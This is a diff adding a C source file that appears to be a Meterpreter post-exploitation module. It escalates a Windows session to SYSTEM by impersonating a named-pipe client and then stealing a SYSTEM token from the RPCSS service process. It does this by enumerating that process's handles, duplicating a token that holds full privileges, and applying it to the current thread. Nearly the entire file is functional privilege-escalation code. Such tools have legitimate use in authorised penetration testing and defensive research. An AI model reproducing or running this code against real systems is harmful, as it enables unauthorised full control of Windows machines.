@@ -1,0 +1,351 @@
+#include <winternl.h>
+#include "precomp.h"
+#include "common_metapi.h"
+#include "namedpipe.h"
+#include "service.h"
+
+#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
+typedef NTSTATUS(WINAPI* NTQUERYINFORMATIONPROCESS)(HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
+typedef NTSTATUS(WINAPI* NTQUERYOBJECT)(HANDLE Handle, DWORD ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength);
+
+typedef enum _OBJECT_INFORMATION_CLASS {
+	ObjectBasicInformation = 0,
+	ObjectTypeInformation = 2
+} OBJECT_INFORMATION_CLASS;
+
+typedef enum _PROCESSINFOCLASS
+{
+	ProcessBasicInformation = 0,
+	ProcessHandleInformation = 51,
+} PROCESSINFOCLASS;
+
+typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO
+{
+	HANDLE HandleValue;
+	ULONG_PTR HandleCount;
+	ULONG_PTR PointerCount;
+	ACCESS_MASK GrantedAccess;
+	ULONG ObjectTypeIndex;
+	ULONG HandleAttributes;
+	ULONG Reserved;
+} PROCESS_HANDLE_TABLE_ENTRY_INFO, * PPROCESS_HANDLE_TABLE_ENTRY_INFO;
+
+typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION
+{
+	ULONG_PTR NumberOfHandles;
+	ULONG_PTR Reserved;
+	PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
+} PROCESS_HANDLE_SNAPSHOT_INFORMATION, * PPROCESS_HANDLE_SNAPSHOT_INFORMATION;
+
+typedef struct _OBJECT_TYPE_INFORMATION
+{
+	_UNICODE_STRING TypeName;
+	ULONG TotalNumberOfObjects;
+	ULONG TotalNumberOfHandles;
+	ULONG TotalPagedPoolUsage;
+	ULONG TotalNonPagedPoolUsage;
+	ULONG TotalNamePoolUsage;
+	ULONG TotalHandleTableUsage;
+	ULONG HighWaterNumberOfObjects;
+	ULONG HighWaterNumberOfHandles;
+	ULONG HighWaterPagedPoolUsage;
+	ULONG HighWaterNonPagedPoolUsage;
+	ULONG HighWaterNamePoolUsage;
+	ULONG HighWaterHandleTableUsage;
+	ULONG InvalidAttributes;
+	GENERIC_MAPPING GenericMapping;
+	ULONG ValidAccessMask;
+	BOOLEAN SecurityRequired;
+	BOOLEAN MaintainHandleCount;
+	UCHAR TypeIndex;
+	CHAR ReservedByte;
+	ULONG PoolType;
+	ULONG DefaultPagedPoolCharge;
+	ULONG DefaultNonPagedPoolCharge;
+} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;
+
+/*
+ * Compare two LUID values and return true if they are the same.
+ */
+BOOL is_equal_luid(const PLUID luid1, const PLUID luid2) {
+	return ((luid1->HighPart == luid2->HighPart) && (luid1->LowPart == luid2->LowPart));
+}
+
+/*
+ * Get the object type index for token objects. The index changes between versions and using it
+ * simplifies the searching process.
+ */
+DWORD get_token_object_index(PULONG TokenIndex)
+{
+	HANDLE hToken = NULL;
+	NTSTATUS status;
+	HMODULE hNtdll = NULL;
+	NTQUERYOBJECT pNtQueryObject = NULL;
+	DWORD dwResult = ERROR_UNIDENTIFIED_ERROR;
+
+	struct {
+		OBJECT_TYPE_INFORMATION TypeInfo;
+		WCHAR TypeNameBuffer[sizeof("Token")];
+	} typeInfoWithName;
+
+	do {
+		if (!OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &hToken)) {
+			BREAK_ON_ERROR("[ELEVATE] get_token_object_index. OpenProcessToken failed");
+		}
+
+		hNtdll = GetModuleHandle("ntdll");
+		if (hNtdll == NULL) {
+			BREAK_ON_ERROR("[ELEVATE] get_token_object_index. GetModuleHandle(\"ntdll\") failed");
+		}
+
+		pNtQueryObject = (NTQUERYOBJECT)(GetProcAddress(hNtdll, "NtQueryObject"));
+		if (pNtQueryObject == NULL) {
+			BREAK_ON_ERROR("[ELEVATE] get_token_object_index. GetProcAddress(hNtdll, \"NtQueryObject\") failed");
+		}
+
+		status = pNtQueryObject(hToken, ObjectTypeInformation, &typeInfoWithName, sizeof(typeInfoWithName), NULL);
+		if (!NT_SUCCESS(status)) {
+			BREAK_WITH_ERROR("[ELEVATE] get_token_object_index. NtQueryObject failed", HRESULT_FROM_NT(status));
+		}
+
+		*TokenIndex = typeInfoWithName.TypeInfo.TypeIndex;
+		dwResult = ERROR_SUCCESS;
+	} while (0);
+
+	if (hToken) {
+		CloseHandle(hToken);
+	}
+	return dwResult;
+}
+
+DWORD get_system_token(HANDLE hProc, PHANDLE phToken)
+{
+	NTSTATUS status;
+	PROCESS_HANDLE_SNAPSHOT_INFORMATION localInfo;
+	PPROCESS_HANDLE_SNAPSHOT_INFORMATION handleInfo = &localInfo;
+	ULONG bytes;
+	ULONG tokenIndex;
+	ULONG i;
+	DWORD dwResult = ERROR_UNIDENTIFIED_ERROR;
+	HANDLE hToken = NULL;
+	HANDLE hThread = GetCurrentThread();
+	TOKEN_STATISTICS tokenStats;
+	LUID systemLuid = SYSTEM_LUID;
+	HMODULE hNtdll = NULL;
+	NTQUERYINFORMATIONPROCESS pNtQueryInformationProcess = NULL;
+
+	do {
+		if (get_token_object_index(&tokenIndex) != ERROR_SUCCESS) {
+			BREAK_WITH_ERROR("[ELEVATE] get_system_token. get_token_object_index failed", ERROR_UNIDENTIFIED_ERROR);
+		}
+
+		hNtdll = GetModuleHandle("ntdll");
+		if (hNtdll == NULL) {
+			BREAK_ON_ERROR("[ELEVATE] get_system_token. GetModuleHandle(\"ntdll\") failed");
+		}
+
+		pNtQueryInformationProcess = (NTQUERYINFORMATIONPROCESS)(GetProcAddress(hNtdll, "NtQueryInformationProcess"));
+		if (pNtQueryInformationProcess == NULL) {
+			BREAK_ON_ERROR("[ELEVATE] get_system_token. GetProcAddress(hNtdll, \"NtQueryInformationProcess\") failed");
+		}
+
+		status = pNtQueryInformationProcess(hProc, ProcessHandleInformation, handleInfo, sizeof(*handleInfo), &bytes);
+		if (NT_SUCCESS(status)) {
+			BREAK_WITH_ERROR("[ELEVATE] get_system_token. NtQueryInformationProcess failed (1st call)", HRESULT_FROM_NT(status));
+		}
+
+		handleInfo = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bytes);
+		if (handleInfo == NULL) {
+			BREAK_WITH_ERROR("[ELEVATE] get_system_token. get_token_object_index failed", ERROR_NOT_ENOUGH_MEMORY);
+		}
+
+		status = pNtQueryInformationProcess(hProc, ProcessHandleInformation, handleInfo, bytes, NULL);
+		if (!NT_SUCCESS(status)) {
+			BREAK_WITH_ERROR("[ELEVATE] get_system_token. NtQueryInformationProcess failed (2nd call)", HRESULT_FROM_NT(status));
+		}
+
+		for (i = 0; i < handleInfo->NumberOfHandles; i++) {
+			if (handleInfo->Handles[i].ObjectTypeIndex != tokenIndex) {
+				continue;
+			}
+
+			// TODO: this 0xf01ff value needs to be examined...
+			if (handleInfo->Handles[i].GrantedAccess != 0xf01ff) {
+				continue;
+			}
+
+			if (!DuplicateHandle(hProc, handleInfo->Handles[i].HandleValue, GetCurrentProcess(), &hToken, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
+				CONTINUE_ON_ERROR("[ELEVATE] get_system_token. DuplicateHandle failed");
+			}
+
+			if (!GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &bytes)) {
+				CloseHandle(hToken);
+				CONTINUE_ON_ERROR("[ELEVATE] get_system_token. GetTokenInformation failed");
+			}
+
+			if (!is_equal_luid(&tokenStats.AuthenticationId, &systemLuid)) {
+				CloseHandle(hToken);
+				continue;
+			}
+
+			// TODO: check this value for systems older than Windows 10
+			if (tokenStats.PrivilegeCount < 22) { 
+				CloseHandle(hToken);
+				continue;
+			}
+
+			if (!SetThreadToken(&hThread, hToken)) {
+				CloseHandle(hToken);
+				CONTINUE_ON_ERROR("[ELEVATE] get_system_token. SetThreadToken failed");
+			}
+
+			*phToken = hToken;
+			dwResult = ERROR_SUCCESS;
+			break;
+		}
+	} while (0);
+
+	if (handleInfo != &localInfo) {
+		HeapFree(GetProcessHeap(), 0, handleInfo);
+	}
+	return dwResult;
+}
+
+DWORD post_callback_use_rpcss(Remote* remote)
+{
+	SC_HANDLE hScm = NULL;
+	SC_HANDLE hSvc = NULL;
+	HANDLE hProc = NULL;
+	SERVICE_STATUS_PROCESS procInfo;
+	DWORD dwBytes;
+	DWORD dwResult = ERROR_ACCESS_DENIED;
+	HANDLE hToken = NULL;
+
+	do {
+		hScm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
+		if (hScm == NULL) {
+			BREAK_ON_ERROR("[ELEVATE] post_callback_use_rpcss. OpenSCManager failed");
+		}
+
+		hSvc = OpenService(hScm, "rpcss", SERVICE_QUERY_STATUS);
+		if (hSvc == NULL) {
+			BREAK_ON_ERROR("[ELEVATE] post_callback_use_rpcss. OpenService failed");
+		}
+
+		if (!QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO, (LPBYTE)&procInfo, sizeof(procInfo), &dwBytes)) {
+			BREAK_ON_ERROR("[ELEVATE] post_callback_use_rpcss. QueryServiceStatusEx failed");
+		}
+
+		hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procInfo.dwProcessId);
+		if (hProc == NULL) {
+			BREAK_ON_ERROR("[ELEVATE] post_callback_use_rpcss. OpenProcess failed");
+		}
+
+		if (get_system_token(hProc, &hToken) != ERROR_SUCCESS) {
+			BREAK_ON_ERROR("[ELEVATE] post_callback_use_rpcss. get_system_token failed");
+		}
+
+		dwResult = ERROR_SUCCESS;
+		dprintf("[ELEVATE] post_callback_use_rpcss. dispatching to use_self");
+		met_api->thread.update_token(remote, hToken);
+		return ERROR_SUCCESS;
+	} while (0);
+
+	if (hProc) {
+		CloseHandle(hProc);
+		hProc = NULL;
+	}
+
+	if (hSvc) {
+		CloseServiceHandle(hSvc);
+		hSvc = NULL;
+	}
+
+	if (hScm) {
+		CloseServiceHandle(hScm);
+		hScm = NULL;
+	}
+	return dwResult;
+}
+
+DWORD elevate_via_service_namedpipe_rpcss(Remote* remote, Packet* packet)
+{
+	DWORD dwResult = ERROR_ACCESS_DENIED;
+	THREAD* pThread = NULL;
+	HANDLE hSem = NULL;
+	char cPipeName1[MAX_PATH] = { 0 };
+	char cPipeName2[MAX_PATH] = { 0 };
+	OSVERSIONINFO os = { 0 };
+	HANDLE hPipe = NULL;
+	DWORD dwPipeUid[2] = { 0, 0 };
+
+	do {
+		os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
+		if (!GetVersionEx(&os)) {
+			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss: GetVersionEx failed")
+		}
+
+		// filter out systems older than Windows XP (5.1) for this technique
+		if ((os.dwMajorVersion < 5) || (os.dwMajorVersion == 5 && os.dwMinorVersion == 0)) {
+			SetLastError(ERROR_ACCESS_DENIED);
+			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss: Windows 2000 and older are unsupported");
+		}
+
+		// generate a pseudo random name for the pipe
+		dwPipeUid[0] = ((rand() << 16) | rand());
+		dwPipeUid[1] = ((rand() << 16) | rand());
+
+		_snprintf_s(cPipeName1, sizeof(cPipeName1), MAX_PATH, "\\\\.\\pipe\\%08x%08x", dwPipeUid[0], dwPipeUid[1]);
+		// this *MUST* use the "\\localhost\pipe" prefix and not the "\\.\pipe" prefix
+		_snprintf_s(cPipeName2, sizeof(cPipeName2), MAX_PATH, "\\\\localhost\\pipe\\%08x%08x", dwPipeUid[0], dwPipeUid[1]);
+
+		dprintf("[ELEVATE] elevate_via_service_namedpipe_rpcss. using pipename: %s", cPipeName1);
+
+		hSem = CreateSemaphore(NULL, 0, 1, NULL);
+		pThread = met_api->thread.create(elevate_namedpipe_thread, &cPipeName1, remote, hSem, post_callback_use_rpcss);
+		if (!pThread) {
+			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss. met_api->thread.create failed", ERROR_INVALID_HANDLE);
+		}
+
+		if (!met_api->thread.run(pThread)) {
+			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss. met_api->thread.run failed", ERROR_ACCESS_DENIED);
+		}
+
+		// wait for the thread to create the pipe, if it times out terminate
+		if (hSem) {
+			if (WaitForSingleObject(hSem, 500) != WAIT_OBJECT_0) {
+				BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss. WaitForSingleObject failed", ERROR_ACCESS_DENIED);
+			}
+		} else {
+			Sleep(500);
+		}
+
+		hPipe = CreateFile(cPipeName2, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+		if (hPipe == INVALID_HANDLE_VALUE) {
+			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss. CreateFile failed");
+		}
+
+		if (!WriteFile(hPipe, "\x00", 1, NULL, NULL)) {
+			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss. WriteFile failed");
+		}
+
+		WaitForSingleObject(pThread->handle, 5000);
+		met_api->thread.sigterm(pThread);
+		met_api->thread.join(pThread);
+
+		if (!GetExitCodeThread(pThread->handle, &dwResult)) {
+			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss. GetExitCodeThread failed", ERROR_INVALID_HANDLE);
+		}
+	} while (0);
+
+	if (hPipe) {
+		CloseHandle(hPipe);
+	}
+	if (pThread) {
+		met_api->thread.destroy(pThread);
+	}
+	if (hSem) {
+		CloseHandle(hSem);
+	}
+	return dwResult;
+}
